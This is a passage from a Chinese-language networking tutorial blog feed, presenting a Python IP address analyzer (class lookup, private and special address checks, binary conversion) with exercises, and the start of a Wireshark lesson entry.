class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day08_ip_analyzer.py</span><br><span class="hljs-comment"># 功能：IP地址分析工具</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IPAnalyzer</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;IP地址分析器&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 私网IP地址范围</span><br>        <span class="hljs-variable language_">self</span>.private_ranges = [<br>            (<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;10.255.255.255&#x27;</span>),<br>            (<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>, <span class="hljs-string">&#x27;172.31.255.255&#x27;</span>),<br>            (<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>, <span class="hljs-string">&#x27;192.168.255.255&#x27;</span>)<br>        ]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_to_int</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        将IP地址转换为整数</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串（如 &quot;192.168.1.1&quot;）</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            整数形式的IP</span><br><span class="hljs-string"></span><br><span class="hljs-string">        工作原理：</span><br><span class="hljs-string">            192.168.1.1 = 192*256^3 + 168*256^2 + 1*256 + 1</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        parts = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) + \<br>               (<span class="hljs-built_in">int</span>(parts[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">3</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_ip</span>(<span class="hljs-params">self, num</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        将整数转换为IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            num: 整数形式的IP</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            IP地址字符串</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.&quot;</span> \<br>               <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;(num &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">255</span>&#125;</span>.<span class="hljs-subst">&#123;num &amp; <span class="hljs-number">255</span>&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ip_to_binary</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        将IP地址转换为二进制表示</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            二进制字符串（用点分隔）</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        parts = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        binary_parts = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(part), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> parts]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span>.join(binary_parts)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_ip</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        验证IP地址格式是否正确</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            True/False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        pattern = <span class="hljs-string">r&#x27;^(\d&#123;1,3&#125;)\.(\d&#123;1,3&#125;)\.(\d&#123;1,3&#125;)\.(\d&#123;1,3&#125;)$&#x27;</span><br>        <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(pattern, ip)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-comment"># 检查每个数字是否在0-255范围内</span><br>        <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-keyword">match</span>.groups():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(num) &gt; <span class="hljs-number">255</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ip_class</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        判断IP地址的类别（A/B/C/D/E类）</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            类别字符串和详细信息</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        first_octet = <span class="hljs-built_in">int</span>(ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt;= first_octet &lt;= <span class="hljs-number">126</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;大型网络&#x27;</span>, <span class="hljs-string">&#x27;1-126&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">128</span> &lt;= first_octet &lt;= <span class="hljs-number">191</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;中型网络&#x27;</span>, <span class="hljs-string">&#x27;128-191&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">192</span> &lt;= first_octet &lt;= <span class="hljs-number">223</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;小型网络&#x27;</span>, <span class="hljs-string">&#x27;192-223&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">224</span> &lt;= first_octet &lt;= <span class="hljs-number">239</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;组播地址&#x27;</span>, <span class="hljs-string">&#x27;224-239&#x27;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">240</span> &lt;= first_octet &lt;= <span class="hljs-number">255</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;保留地址&#x27;</span>, <span class="hljs-string">&#x27;240-255&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;未知&#x27;</span>, <span class="hljs-string">&#x27;特殊地址&#x27;</span>, <span class="hljs-string">&#x27;0或127&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_private_ip</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        判断是否为私网IP</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            True/False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        ip_int = <span class="hljs-variable language_">self</span>.ip_to_int(ip)<br><br>        <span class="hljs-keyword">for</span> start, end <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.private_ranges:<br>            start_int = <span class="hljs-variable language_">self</span>.ip_to_int(start)<br>            end_int = <span class="hljs-variable language_">self</span>.ip_to_int(end)<br><br>            <span class="hljs-keyword">if</span> start_int &lt;= ip_int &lt;= end_int:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_special_ip</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        判断是否为特殊IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            (是否特殊, 类型说明)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 环回地址</span><br>        <span class="hljs-keyword">if</span> ip.startswith(<span class="hljs-string">&#x27;127.&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;环回地址（Loopback）&#x27;</span><br><br>        <span class="hljs-comment"># 默认路由</span><br>        <span class="hljs-keyword">if</span> ip == <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;默认路由/任意地址&#x27;</span><br><br>        <span class="hljs-comment"># 受限广播</span><br>        <span class="hljs-keyword">if</span> ip == <span class="hljs-string">&#x27;255.255.255.255&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;受限广播地址&#x27;</span><br><br>        <span class="hljs-comment"># 网络地址（主机号全0）</span><br>        <span class="hljs-keyword">if</span> ip.endswith(<span class="hljs-string">&#x27;.0&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;网络地址&#x27;</span><br><br>        <span class="hljs-comment"># 广播地址（主机号全255）</span><br>        <span class="hljs-keyword">if</span> ip.endswith(<span class="hljs-string">&#x27;.255&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;广播地址&#x27;</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        全面分析IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            分析结果字典</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.validate_ip(ip):<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;valid&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;IP地址格式不正确&#x27;</span>&#125;<br><br>        result = &#123;<br>            <span class="hljs-string">&#x27;valid&#x27;</span>: <span class="hljs-literal">True</span>,<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: ip,<br>            <span class="hljs-string">&#x27;binary&#x27;</span>: <span class="hljs-variable language_">self</span>.ip_to_binary(ip),<br>            <span class="hljs-string">&#x27;integer&#x27;</span>: <span class="hljs-variable language_">self</span>.ip_to_int(ip),<br>            <span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-variable language_">self</span>.get_ip_class(ip),<br>            <span class="hljs-string">&#x27;is_private&#x27;</span>: <span class="hljs-variable language_">self</span>.is_private_ip(ip),<br>            <span class="hljs-string">&#x27;is_public&#x27;</span>: <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.is_private_ip(ip) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.is_special_ip(ip)[<span class="hljs-number">0</span>],<br>            <span class="hljs-string">&#x27;special&#x27;</span>: <span class="hljs-variable language_">self</span>.is_special_ip(ip)<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_analysis</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        打印IP地址分析结果</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            ip: IP地址字符串</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IP地址分析结果&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        result = <span class="hljs-variable language_">self</span>.analyze(ip)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result[<span class="hljs-string">&#x27;valid&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n❌ <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;error&#x27;</span>]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📍 IP地址: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔢 十进制: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;integer&#x27;</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;💾 二进制: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;binary&#x27;</span>]&#125;</span>&quot;</span>)<br><br>        ip_class, usage, range_str = result[<span class="hljs-string">&#x27;class&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📊 地址类别: <span class="hljs-subst">&#123;ip_class&#125;</span>类&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   用途: <span class="hljs-subst">&#123;usage&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   范围: <span class="hljs-subst">&#123;range_str&#125;</span>&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🌐 地址类型:&quot;</span>)<br>        <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ⭐ <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">elif</span> result[<span class="hljs-string">&#x27;is_private&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   🏠 私网IP（不能在互联网上直接访问）&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   🌍 公网IP（可以在互联网上直接访问）&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ips</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取本机所有IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        IP地址列表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 获取主机名</span><br>        hostname = socket.gethostname()<br><br>        <span class="hljs-comment"># 获取所有IP</span><br>        ips = socket.gethostbyname_ex(hostname)[<span class="hljs-number">2</span>]<br><br>        <span class="hljs-keyword">return</span> ips<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    analyzer = IPAnalyzer()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IP地址分析工具&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-comment"># 显示本机IP</span><br>    local_ips = get_local_ips()<br>    <span class="hljs-keyword">if</span> local_ips:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n💻 本机IP地址:&quot;</span>)<br>        <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> local_ips:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   <span class="hljs-subst">&#123;ip&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n请选择操作:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 分析IP地址&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. IP地址转换（十进制 ↔ 二进制）&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 批量分析&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. 退出&quot;</span>)<br><br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入选项: &quot;</span>).strip()<br><br>        <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n再见！&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入IP地址: &quot;</span>).strip()<br>            <span class="hljs-keyword">if</span> ip:<br>                analyzer.print_analysis(ip)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入IP地址: &quot;</span>).strip()<br>            <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">and</span> analyzer.validate_ip(ip):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n十进制: <span class="hljs-subst">&#123;ip&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;二进制: <span class="hljs-subst">&#123;analyzer.ip_to_binary(ip)&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;整数: <span class="hljs-subst">&#123;analyzer.ip_to_int(ip)&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n请输入多个IP地址（每行一个，输入空行结束）:&quot;</span>)<br>            ips = []<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                ip = <span class="hljs-built_in">input</span>().strip()<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip:<br>                    <span class="hljs-keyword">break</span><br>                ips.append(ip)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;IP地址&#x27;</span>:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;类别&#x27;</span>:&lt;<span class="hljs-number">8</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;类型&#x27;</span>:&lt;<span class="hljs-number">15</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">45</span>)<br><br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:<br>                result = analyzer.analyze(ip)<br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;valid&#x27;</span>]:<br>                    ip_class = result[<span class="hljs-string">&#x27;class&#x27;</span>][<span class="hljs-number">0</span>]<br>                    <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">0</span>]:<br>                        ip_type = result[<span class="hljs-string">&#x27;special&#x27;</span>][<span class="hljs-number">1</span>][:<span class="hljs-number">12</span>]<br>                    <span class="hljs-keyword">elif</span> result[<span class="hljs-string">&#x27;is_private&#x27;</span>]:<br>                        ip_type = <span class="hljs-string">&#x27;私网&#x27;</span><br>                    <span class="hljs-keyword">else</span>:<br>                        ip_type = <span class="hljs-string">&#x27;公网&#x27;</span><br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">18</span>&#125;</span> <span class="hljs-subst">&#123;ip_class:&lt;<span class="hljs-number">8</span>&#125;</span> <span class="hljs-subst">&#123;ip_type:&lt;<span class="hljs-number">15</span>&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day08/day08_ip_analyzer.py<br></code></pre></td></tr></table></figure><h2 id="🎓-知识小结">🎓 知识小结</h2><p>今天我们学习了：</p><ol><li>✅ IP地址是32位二进制数（IPv4）</li><li>✅ IP地址分为5类：A/B/C/D/E</li><li>✅ 私网IP不能在互联网上直接使用</li><li>✅ 特殊IP地址有特定用途</li><li>✅ 能够分析和转换IP地址</li></ol><h2 id="💪-练习题">💪 练习题</h2><ol><li><p>判断以下IP地址的类别和类型：</p><ul><li>10.0.0.1</li><li>172.20.1.1</li><li>202.96.209.133</li><li>127.0.0.1</li></ul></li><li><p>将以下IP转换为二进制：</p><ul><li>192.168.1.1</li><li>255.255.255.0</li></ul></li><li><p>计算：A类地址的网络数和每个网络的主机数</p></li></ol><hr><p>💡 <strong>今日金句</strong>：IP地址是互联网的基石！</p><p>👉 <a href="../week01/day07.md">上一天：Wireshark抓包</a> | <a href="../../README.md">返回目录</a> | <a href="day09.md">下一天：子网划分实战</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>7天：Wireshark抓包入门</title>
    <link href="/2025/11/10/7%E5%A4%A9%EF%BC%9AWireshark%E6%8A%93%E5%8C%85%E5%85%A5%E9%97%A8/"/>
    <url>/2025/11/10/7%E5%A4%A9%EF%BC%9AWireshark%E6%8A%93%E5%8C%85%E5%85%A5%E9%97%A8/</url>
    
